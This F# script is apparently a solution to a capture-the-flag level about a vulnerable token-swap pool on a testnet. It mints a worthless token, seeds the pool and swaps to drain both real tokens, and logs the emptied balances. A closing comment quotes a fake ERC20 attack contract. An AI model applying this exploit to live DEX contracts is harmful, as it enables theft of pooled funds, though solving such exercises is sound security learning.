#i """nuget: C:\Users\jon_h\source\repos\web3\web3.fs\bin\Release\"""
#r "nuget: web3.fs, 0.2.1" 

open web3.fs

// Values and partial applications
let env = createWeb3Environment "http://127.0.0.1:1248" "2.0" "0x2268b96e204379ee8366505c344ebe5cc34d3a46"

let call = makeEthCall env
let txn = makeEthTxn env

// use the webpage to deploy an instance, so that when we submit we get the blurb

// My instance: 0x1341813CffAB322C7a486a8392875847b0F9e6b3

// So, this is similar to Dex1; This allows me to swap against any token that I'm willing to supply liquidity
// for. I mint my own shitcoin, send the pool 1, and then swap for 1 and then 2 of my shitcoin against the two
// tokens.

let poolABI = """[{"inputs":[{"internalType":"address","name":"_token1","type":"address"},{"internalType":"address","name":"_token2","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"address","name":"token_address","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"add_liquidity","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"get_swap_amount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"swap","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"token1","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"token2","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}]""" |> ABI
let pool = loadDeployedContract env "0x1341813CffAB322C7a486a8392875847b0F9e6b3" RINKEBY poolABI |> bindDeployedContract |> List.head

let tokenMinterABI = """[{"inputs":[{"internalType":"string","name":"name","type":"string"},{"internalType":"string","name":"symbol","type":"string"},{"internalType":"uint256","name":"initialSupply","type":"uint256"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]""" |> ABI
//let tokenMinterBytecode = """60806040[...]""" |> RawContractBytecode

prepareUndeployedContract env tokenMinterBytecode (Some [String "distrust"; String "DIS"; Uint256 "4"]) RINKEBY tokenMinterABI
|> Result.bind(deployEthContract env ZEROV)
|> env.log Log

let tokenMinter = loadDeployedContract env "0x11fee3fc9bd59f8902e1850614fda6023c5e29c3" RINKEBY tokenMinterABI |> bindDeployedContract |> List.head
// check the config and values of the pool
let token1 = call pool (ByString "token1") [] |> env.log Emit |> unwrapCallResult |> List.head
let token2 = call pool (ByString "token2") [] |> env.log Emit |> unwrapCallResult |> List.head

let checkPoolBalances () = 
    [token1; token2; Address "0x11fee3fc9bd59f8902e1850614fda6023c5e29c3"]
    |> List.map (fun t -> call pool (ByString "balanceOf") [t; Address $"{pool.address}" ] |> env.log Log )
    |> ignore

checkPoolBalances()
// [+] Call result: [Uint256 "100"]
// [+] Call result: [Uint256 "100"]

// Allow the pool to swap on our behalf
txn tokenMinter (ByString "approve") [Address "0x1341813CffAB322C7a486a8392875847b0F9e6b3"; Uint256 "10000"] ZEROV 
|> env.log Log

// seed pool with one token of shitcoin
txn pool (ByString "add_liquidity") [Address "0x11fee3fc9bd59f8902e1850614fda6023c5e29c3"; Uint256 "1"] ZEROV
|> env.log Log

// Ready to rock
// [+] Call result: [Uint256 "100"]
// [+] Call result: [Uint256 "100"]
// [+] Call result: [Uint256 "1"]
    
txn pool (ByString "swap") [Address "0x11fee3fc9bd59f8902e1850614fda6023c5e29c3"; token1; Uint256 "1"] ZEROV
|> env.log Log

txn pool (ByString "swap") [Address "0x11fee3fc9bd59f8902e1850614fda6023c5e29c3"; token2; Uint256 "2"] ZEROV
|> env.log Log

checkPoolBalances ()

// winner winner chicken dinner
// [+] Call result: [Uint256 "0"]
// [+] Call result: [Uint256 "0"]
// [+] Call result: [Uint256 "4"]

(*
    Now, it seems like I did this in the most straightforward way, exploiting the math. However, the blurb suggests
    that the 'real' way to do this was to create a malicious ERC20 whose `transfer()` method didn't work correctly.

    I thought about making a contract like this first, but decided on a simpler method instead.

    Looking at the Attack dir shows this:

    contract DexTwoAttackToken {
    function balanceOf(address) external pure returns (uint256) {
        return 1;
    }

    function transferFrom(
        address,
        address,
        uint256
    ) external pure returns (bool) {
        return true;
    }
}

    Notably, it doesn't even bother to `is ERC20` or anything.
    Ultimately, either way works for this exercise. If the contract owner vetted contracts, maybe mine would
    get through and this wouldn't. If they cared about minting (or corrected the swap math) maybe this would
    get through. Tough to say.
*)
